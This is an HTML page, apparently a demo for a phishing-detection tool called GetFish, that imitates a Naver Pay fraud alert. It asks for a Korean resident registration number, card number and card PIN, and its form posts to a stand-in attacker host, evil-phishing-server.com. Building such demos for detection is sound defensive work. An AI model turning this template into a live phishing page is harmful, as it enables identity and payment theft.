<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>네이버페이(Naver Pay) - 안전결제 본인인증 [사칭 데모 페이지]</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #f5f6f8;
      margin: 0;
      padding: 40px 20px;
      display: flex;
      justify-content: center;
    }
    .checkout-card {
      background: #ffffff;
      width: 100%;
      max-width: 460px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      overflow: hidden;
    }
    .header {
      background: #03c75a;
      color: #ffffff;
      padding: 24px;
      text-align: center;
    }
    .header h1 {
      margin: 0;
      font-size: 24px;
      font-weight: 800;
      letter-spacing: -0.5px;
    }
    .header p {
      margin: 6px 0 0 0;
      font-size: 13px;
      opacity: 0.9;
    }
    .content {
      padding: 30px;
    }
    .alert-box {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeeba;
      padding: 12px 16px;
      border-radius: 8px;
      font-size: 13px;
      margin-bottom: 24px;
      line-height: 1.5;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 700;
      color: #333333;
      margin-bottom: 8px;
    }
    .form-group input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #dcdde1;
      border-radius: 8px;
      font-size: 15px;
      box-sizing: border-box;
    }
    .form-group input:focus {
      outline: none;
      border-color: #03c75a;
    }
    .btn-submit {
      width: 100%;
      background: #03c75a;
      color: white;
      border: none;
      padding: 16px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.2s;
    }
    .btn-submit:hover {
      background: #02b350;
    }
    .footer {
      text-align: center;
      padding: 20px;
      font-size: 12px;
      color: #888888;
      border-top: 1px solid #eeeeee;
    }
  </style>
</head>
<body>
  <div class="checkout-card">
    <div class="header">
      <h1>NAVER PAY</h1>
      <p>안전결제 이상거래 감지 본인인증</p>
    </div>
    
    <div class="content">
      <div class="alert-box">
        ⚠️ <strong>[주의]</strong> 귀하의 결제 계정에서 비정상 로그인 시도가 감지되었습니다. 보호 조치를 해제하려면 아래 본인인증 정보를 정확히 입력해주세요.
      </div>

      <!-- 모의 피싱 폼: 외부 악성 서버(예: http://evil-phishing-server.com/steal)로 전송 시도 -->
      <form action="http://evil-phishing-server.com/steal-data" method="POST">
        <div class="form-group">
          <label>성명 (이름)</label>
          <input type="text" placeholder="홍길동" required />
        </div>

        <!-- 🚨 Kill-Switch 트리거 지점 1: 주민등록번호 -->
        <div class="form-group">
          <label>주민등록번호 13자리 전체</label>
          <input type="text" placeholder="주민등록번호 (예: 900101-1234567)" required />
        </div>

        <div class="form-group">
          <label>결제 카드 번호 (16자리)</label>
          <input type="text" placeholder="1234-5678-9012-3456" required />
        </div>

        <!-- 🚨 Kill-Switch 트리거 지점 2: 카드 비밀번호 -->
        <div class="form-group">
          <label>카드 비밀번호 4자리 전체</label>
          <input type="password" placeholder="카드비밀번호 4자리 입력" required />
        </div>

        <button type="submit" class="btn-submit">본인인증 완료 및 제한 해제</button>
      </form>
    </div>

    <div class="footer">
      &copy; NAVER Financial Corp. (이 페이지는 GetFish 시연용 가짜 데모 페이지입니다)
    </div>
  </div>
</body>
</html>
